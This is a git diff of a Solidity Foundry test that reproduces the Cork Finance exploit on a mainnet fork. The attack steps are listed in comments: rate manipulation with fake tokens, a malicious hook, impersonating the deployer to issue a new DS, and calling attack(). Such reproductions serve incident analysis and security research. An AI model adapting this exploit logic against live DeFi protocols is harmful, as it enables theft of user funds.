@@ -17,7 +17,7 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
     address exchangeRateProvider = 0x7b285955DdcbAa597155968f9c4e901bb4c99263;
     IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
     IERC20 weETH5CT = IERC20(0xD7CAc118c007E6427ABD693e193E90a6918ce404);
-    IERC20 weETH8CT = IERC20(0xCd25aA56AAD1BCC1BB4b6B6b08BDa53007ec81CE);
+
     IERC20 etherfiWETH = IERC20(0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee);
     IERC20 lpToken = IERC20(0x05816980fAEC123dEAe7233326a1041f372f4466);
 
@@ -45,7 +45,6 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
         0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a;
 
     function setUp() external {
-        string memory RPC_URL = "RPC_URL";
         EXPLOITER_EOA = address(this);
         // Several transactions were involved in this attack.
         // These three are being investigated on this reproduction:
@@ -54,7 +53,7 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
         // 3: 0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d (main attack)
 
         // We pin one block before the first transaction to analyze if they are strictly needed.
-        cheat.createSelectFork(vm.envString(RPC_URL), 22_580_951);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 22_580_951);
 
         // 1.1. Deploy malicious MTK and Attck1 Instances
         mtk = new MyToken();
@@ -91,7 +90,6 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
             assetFactory,
             lpToken,
             wstETH,
-            weETH8CT,
             etherfiWETH,
             corkConfig,
             uniV4PoolManager,
@@ -105,7 +103,7 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
         3. Approve CorkHook to spend all AttSC_1 MTK's
         4. Transfer sequentially 0, 1e18, 2e18, ... , 9e18 to CorkHook, scoping the rate in between
         4.1 Pair id to get the rate: 0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a
-        5. lidoWstETH.transferFrom sender (exploiter EOA) to AttSC_1 the sum of 10e18 
+        5. lidoWstETH.transferFrom sender (exploiter EOA) to AttSC_1 the sum of 10e18
             (req prev approval and balance)
         6. Approve wstETH to Cork's Proxy and call swapRaforDs
         7. Reset wstETH approvals and grant again type(uint256).max to the same Cork's proxy.
@@ -119,46 +117,26 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
 
         // At this point, the attacker managed to manipulate the rate supplying fake worthless tokens.
         // Tx 2 approves the Malicious Callback to handle all Attacker's LP tokens
-        // vm.roll(22_580_970);
+        vm.roll(22_580_970);
         lpToken.approve(address(maliciousHook), type(uint256).max);
         wstETH.approve(address(maliciousHook), type(uint256).max);
 
         // Cork Protocol Issues a New DS at 0xcdd80e59a089cf3e622dc392c622eba9b1ba9780773cc562190191ecb56bf8eb
-        // This new DS uses the same pair ID as before
+        // This new DS uses the same pair ID as before, triggered after expiry of ETH5
         // Prank Deployer's to mimic the chain's state
-        // vm.roll(22_581_003); // one block before
-        // cheat.startPrank((0x777777727073E72Fbb3c81f9A8B88Cc49fEAe2F5));
+        vm.roll(22_581_004); // one block before
+        vm.warp(1_748_431_825); // just after ETH5 expiry
         issueNewDs();
-        // cheat.stopPrank();
 
         /*
         Steps made on 3: 0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d
         */
-        // vm.roll(22_581_019);
+        vm.roll(22_581_019);
         maliciousHook.attack();
     }
 
     function issueNewDs() internal {
-        cheat.prank(0x777777727073E72Fbb3c81f9A8B88Cc49fEAe2F5);
-        console.log(msg.sender);
-        moduleCoreProxy.issueNewDs(PAIR_ID_FOR_RATE, 0, 480, 1_748_433_923);
-
-        // // Set base fee value
-        // uint256 lastDsId = moduleCoreProxy.lastDsId(PAIR_ID_FOR_RATE);
-        // (address ra, address pa) = moduleCoreProxy.underlyingAsset(PAIR_ID_FOR_RATE);
-        // (address ct, address ds) = moduleCoreProxy.swapAsset(PAIR_ID_FOR_RATE, lastDsId - 1);
-        // (uint256 baseFeePercentage, /* uint256 actualFeePerc */ ) = corkHook.getFee(ra, ct);
-
-        // (address ct_2, address ds_2) = moduleCoreProxy.swapAsset(PAIR_ID_FOR_RATE, lastDsId);
-        // // Set base fee value the same as previous asset
-        // corkHook.updateBaseFeePercentage(ra, ct_2, baseFeePercentage);
-
-        // // Set Split percentage
-        // lastDsId = moduleCoreProxy.lastDsId(PAIR_ID_FOR_RATE);
-        // (ra, pa) = moduleCoreProxy.underlyingAsset(PAIR_ID_FOR_RATE);
-        // (ct, ds) = moduleCoreProxy.swapAsset(PAIR_ID_FOR_RATE, lastDsId - 1);
-        // ICorkHook.MarketSnapshot memory marketSnapshot = corkHook.getMarketSnapshot(ra, ct);
-        // (ct_2, ds_2) = moduleCoreProxy.swapAsset(PAIR_ID_FOR_RATE, lastDsId);
-        // corkHook.updateTreasurySplitPercentage(ra, ct_2, marketSnapshot.treasuryFeePercentage);
+        vm.prank(0x777777727073E72Fbb3c81f9A8B88Cc49fEAe2F5);
+        corkConfig.issueNewDs(PAIR_ID_FOR_RATE, 1_748_433_923);
     }
 }
